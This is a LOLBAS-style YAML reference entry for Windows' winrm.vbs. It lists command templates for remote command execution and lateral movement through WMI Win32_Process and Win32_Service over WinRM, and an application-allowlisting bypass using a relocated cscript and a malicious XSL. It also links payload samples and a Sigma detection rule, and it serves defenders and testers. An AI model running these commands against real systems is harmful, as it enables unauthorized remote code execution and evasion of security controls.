      document_utf8: "---\nName: winrm.vbs\nDescription: Script used for manage Windows RM settings\n\
        Author: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: 'winrm invoke Create wmicimv2/Win32_Process\
        \ @{CommandLine=\"{CMD}\"} -r:http://target:5985'\n    Description: Lateral movement/Remote Command\
        \ Execution via WMI Win32_Process class over the WinRM protocol\n    Usecase: Proxy execution\n\
        \    Category: Execute\n    Privileges: User\n    MitreID: T1216\n    OperatingSystem: Windows\
        \ 10, Windows 11\n    Tags:\n      - Execute: CMD\n      - Execute: Remote\n  - Command: 'winrm\
        \ invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"\
        } -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'\n\
        \    Description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the\
        \ WinRM protocol\n    Usecase: Proxy execution\n    Category: Execute\n    Privileges: Admin\n\
        \    MitreID: T1216\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute:\
        \ CMD\n      - Execute: Remote\n  - Command: '%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\\
        System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'\n    Description: Bypass\
        \ AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious\
        \ WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.\n  \
        \  Usecase: Execute arbitrary, unsigned code via XSL script\n    Category: AWL Bypass\n    Privileges:\
        \ User\n    MitreID: T1220\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute:\
        \ XSL\nFull_Path:\n  - Path: C:\\Windows\\System32\\winrm.vbs\n  - Path: C:\\Windows\\SysWOW64\\\
        winrm.vbs\nCode_Sample:\n  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg\n\
        \  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct\n\
        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml\n\
